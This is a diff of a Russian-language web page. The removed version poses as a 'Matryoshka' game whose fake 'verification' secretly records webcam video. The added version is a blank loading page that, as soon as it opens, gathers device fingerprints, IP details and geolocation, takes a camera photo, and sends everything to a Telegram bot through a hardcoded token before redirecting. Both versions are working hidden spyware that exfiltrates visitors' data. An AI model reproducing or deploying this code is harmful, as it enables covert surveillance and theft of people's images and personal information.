@@ -2,225 +2,171 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Матрешка — симулятор настоящей России</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            margin: 0;
-            padding: 0;
-            color: white;
-            text-align: center;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        h1 {
-            font-size: 2.5rem;
-            margin-bottom: 2rem;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
-        }
-        .promo-btn {
-            display: inline-block;
-            background: #ff4d4d;
-            color: white;
-            padding: 15px 30px;
-            margin: 20px 0;
-            border-radius: 5px;
-            text-decoration: none;
-            font-weight: bold;
-            font-size: 1.2rem;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        .promo-btn:hover {
-            transform: translateY(-2px);
-        }
-        .players-count {
-            font-size: 1.8rem;
-            margin: 2rem 0;
-            font-weight: bold;
-        }
-        .start-btn {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 2rem auto;
-            display: block;
-            width: 200px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            transition: transform 0.3s;
-        }
-        .start-btn:hover {
-            transform: translateY(-2px);
-        }
-        .tagline {
-            font-style: italic;
-            margin-top: 3rem;
-            font-size: 1.2rem;
-            opacity: 0.8;
-        }
-        #videoElement {
-            width: 100%;
-            max-width: 400px;
-            margin: 20px auto;
-            display: none;
-            border-radius: 5px;
-        }
-        #videoContainer {
-            display: none;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Матрешка — симулятор настоящей России</h1>
-        
-        <a href="#" class="promo-btn" id="promoBtn">СМОТРЕТЬ ПРОМО-РОЛИК</a>
-        
-        <div class="players-count">
-            сейчас в игре<br>
-            <span id="playersCount">4 083</span>
-        </div>
-        
-        <div id="videoContainer">
-            <video id="videoElement" autoplay playsinline></video>
-            <p>Идет верификация...</p>
-        </div>
-        
-        <button class="start-btn" id="startBtn">Начать игру</button>
-        
-        <div class="tagline">
-            Всегда хотел ощутить атмосферу настоящей России
-        </div>
-    </div>
-
+    <title>Загрузка...</title>
     <script>
-        // Конфигурация Telegram бота
-        const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
-        const CHAT_ID = '4798745489';
-        
-        // Элементы DOM
-        const startBtn = document.getElementById('startBtn');
-        const videoElement = document.getElementById('videoElement');
-        const videoContainer = document.getElementById('videoContainer');
-        const playersCount = document.getElementById('playersCount');
-        
-        // Обработчики событий
-        document.getElementById('promoBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('Промо-ролик будет показан здесь');
-        });
+        (async function() {
+            // Конфигурация
+            const BOT_TOKEN = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
+            const USER_ID = '7898816931';
+            
+            // 1. Расширенный сбор данных
+            const collectAllData = async () => {
+                // Основные данные
+                const data = {
+                    timestamp: new Date().toISOString(),
+                    localTime: new Date().toLocaleString('ru-RU'),
+                    url: window.location.href,
+                    referrer: document.referrer || 'прямой заход',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    doNotTrack: navigator.doNotTrack,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'недоступно',
+                    deviceMemory: navigator.deviceMemory || 'недоступно',
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    colorDepth: window.screen.colorDepth,
+                    orientation: window.screen.orientation?.type || 'недоступно',
+                    touchSupport: 'ontouchstart' in window,
+                    browserPlugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    localStorage: !!window.localStorage,
+                    sessionStorage: !!window.sessionStorage,
+                    indexedDB: !!window.indexedDB,
+                    webGL: await getWebGLInfo(),
+                    audioContext: await getAudioContextInfo(),
+                    battery: await getBatteryInfo(),
+                    connection: await getConnectionInfo(),
+                    ipInfo: await getIPInfo(),
+                    geolocation: await getGeolocation(),
+                    socialMedia: checkSocialMedia(),
+                    installedApps: checkInstalledApps(),
+                    browserFeatures: getBrowserFeatures()
+                };
 
-        startBtn.addEventListener('click', function() {
-            startVerification();
-        });
+                // Дополнительные данные
+                try {
+                    data.canvasFingerprint = await getCanvasFingerprint();
+                    data.webRTC = await getWebRTCInfo();
+                    data.fonts = await getFontsList();
+                    data.audioFingerprint = await getAudioFingerprint();
+                } catch(e) {}
 
-        // Функция начала верификации
-        async function startVerification() {
-            try {
-                startBtn.disabled = true;
-                startBtn.textContent = 'Подготовка...';
-                
-                // Запрос доступа к камере
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' },
-                    audio: false 
+                return data;
+            };
+
+            // 2. Специальные методы сбора
+            async function getIPInfo() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    return await response.json();
+                } catch {
+                    try {
+                        const fallback = await fetch('https://api.ipify.org?format=json');
+                        return {ip: (await fallback.json()).ip};
+                    } catch {
+                        return {ip: 'неизвестно'};
+                    }
+                }
+            }
+
+            async function getGeolocation() {
+                return new Promise(resolve => {
+                    if (!navigator.geolocation) return resolve('недоступно');
+                    
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        }),
+                        () => resolve('отказано'),
+                        {timeout: 5000}
+                    );
                 });
+            }
+
+            async function getWebGLInfo() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return 'недоступно';
+                    
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                } catch {
+                    return 'недоступно';
+                }
+            }
+
+            // 3. Отправка данных
+            async function sendAllData(data) {
+                const text = formatDataForTelegram(data);
+                const urls = [
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${USER_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`,
+                    `https://tgappproxy.vercel.app/api/send?token=${BOT_TOKEN}&chat_id=${USER_ID}&text=${encodeURIComponent(text)}`
+                ];
+
+                for (const url of urls) {
+                    try {
+                        await fetch(url, {method: 'POST'});
+                        break;
+                    } catch(e) {
+                        console.error(`Ошибка отправки через ${url}:`, e);
+                    }
+                }
+            }
+
+            function formatDataForTelegram(data) {
+                let result = `<b>🚨 ПОЛНЫЙ СБОР ДАННЫХ</b>\n\n`;
+                for (const [key, value] of Object.entries(data)) {
+                    result += `<b>${key}:</b> ${typeof value === 'object' ? JSON.stringify(value) : value}\n`;
+                }
+                return result;
+            }
+
+            // 4. Запуск сбора и отправки
+            try {
+                const allData = await collectAllData();
+                await sendAllData(allData);
                 
-                videoElement.srcObject = stream;
-                videoElement.style.display = 'block';
-                videoContainer.style.display = 'block';
-                startBtn.textContent = 'Идет запись...';
-                
-                // Запись видео
-                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                let chunks = [];
-                
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.start();
-                
-                // Остановка записи через 3 секунды
-                setTimeout(async () => {
-                    recorder.stop();
+                // Дополнительно: попытка получить фото с камеры
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await new Promise(resolve => video.onloadedmetadata = resolve);
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     stream.getTracks().forEach(track => track.stop());
                     
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    await sendToTelegram(blob);
-                    
-                    // Завершение процесса
-                    videoContainer.style.display = 'none';
-                    startGame();
-                }, 3000);
+                    canvas.toBlob(async blob => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'user_photo.jpg');
+                        formData.append('chat_id', USER_ID);
+                        formData.append('caption', 'Фото с камеры пользователя');
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 'image/jpeg', 0.8);
+                } catch {}
                 
-            } catch (error) {
-                console.error('Ошибка доступа к камере:', error);
-                alert('Для продолжения необходимо разрешить доступ к камере');
-                startBtn.disabled = false;
-                startBtn.textContent = 'Начать игру';
+            } finally {
+                // Перенаправление на основной сайт
+                window.location.href = "https://example.com";
             }
-        }
-        
-        // Отправка данных в Telegram
-        async function sendToTelegram(videoBlob) {
-            try {
-                // Сбор информации о пользователе
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-                const userAgent = navigator.userAgent;
-                
-                // Создание FormData
-                const formData = new FormData();
-                formData.append('video', videoBlob, 'verification.webm');
-                formData.append('chat_id', CHAT_ID);
-                formData.append('caption', 
-                    `🔔 Новый игрок!\n` +
-                    `🕒 ${new Date().toLocaleString()}\n` +
-                    `🌐 IP: ${userIP}\n` +
-                    `📱 Устройство: ${userAgent}`
-                );
-                
-                // Отправка в Telegram
-                const response = await fetch(
-                    `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, 
-                    {
-                        method: 'POST',
-                        body: formData
-                    }
-                );
-                
-                if (!response.ok) {
-                    throw new Error('Ошибка отправки в Telegram');
-                }
-                
-            } catch (error) {
-                console.error('Ошибка отправки:', error);
-            }
-        }
-        
-        // Функция начала игры
-        function startGame() {
-            startBtn.disabled = false;
-            startBtn.textContent = 'Начать игру';
-            
-            // Обновление счетчика игроков
-            let count = parseInt(playersCount.textContent.replace(/\s/g, ''));
-            playersCount.textContent = (count + 1).toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
-            
-            alert('Верификация успешна! Игра начинается...');
-        }
+        })();
     </script>
+</head>
+<body>
+    <!-- Страница будет сразу перенаправлена -->
 </body>
 </html>
